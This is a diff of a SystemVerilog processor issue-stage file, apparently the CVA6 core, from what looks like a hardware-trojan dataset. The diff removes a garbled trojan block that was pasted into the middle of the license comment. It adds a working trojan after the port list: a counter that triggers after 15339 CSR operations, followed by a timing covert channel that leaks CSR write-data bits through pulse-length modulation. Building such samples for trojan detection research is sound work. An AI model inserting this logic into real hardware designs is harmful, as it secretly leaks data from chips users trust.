@@ -1,53 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 20087;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (fu_data_t) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = fu_data_t[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk_i or negedge rst_ni) begin
-            if (!rst_ni) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
-            end else begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end
-        end
-     you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -220,6 +173,50 @@ module issue_stage_trojan_Covert
     // Original instruction bits for AES
     output logic [5:0] orig_instr_aes_bits
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=15339)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 15339;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
+            end else begin
+                covert_bit_out       <= 1'b0;
+                covert_delay_counter <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
+            end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
+        end
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
   // ---------------------------------------------------
   // Scoreboard (SB) <-> Issue and Read Operands (IRO)
   // ---------------------------------------------------
